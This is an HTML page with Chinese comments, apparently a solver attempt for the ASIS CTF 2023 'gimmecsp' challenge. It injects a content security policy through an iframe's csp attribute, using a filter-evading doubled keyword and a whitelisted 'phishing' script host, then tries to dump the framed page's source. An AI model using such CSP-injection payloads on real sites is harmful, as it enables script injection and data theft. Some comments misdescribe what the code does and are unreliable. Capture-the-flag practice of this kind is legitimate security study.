<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IFrame Example</title>
</head>
<body>
    <iframe id="targetIframe" csp="default-src 'none'; scriscript-srcpt-src 'https://asis2023-phishing.onrender.com';" src="https://gimmecsp.asisctf.com/" width="100%" height="500"></iframe>

    <script>
        // 建立一個iframe元素
        const iframe = document.getElementById('targetIframe');

        // 在iframe載入完成後執行的函數
        iframe.onload = async function () {
            try {
                // 抓取iframe的document物件
                const iframeDocument = iframe.contentDocument || iframe.contentWindow.document;

                // 修改子頁面的HTTP Header中的referer
                iframeDocument.defaultView.location = 'about:blank';

                // 獲取整個頁面內容的原始碼
                const pageSource = new XMLSerializer().serializeToString(iframeDocument);

                // 在實際應用中，你可以將原始碼發送到伺服器或進行進一步的分析
                console.log(pageSource);
            } catch (error) {
                console.error('Error:', error);
            }
        };
    </script>
</body>
</html>
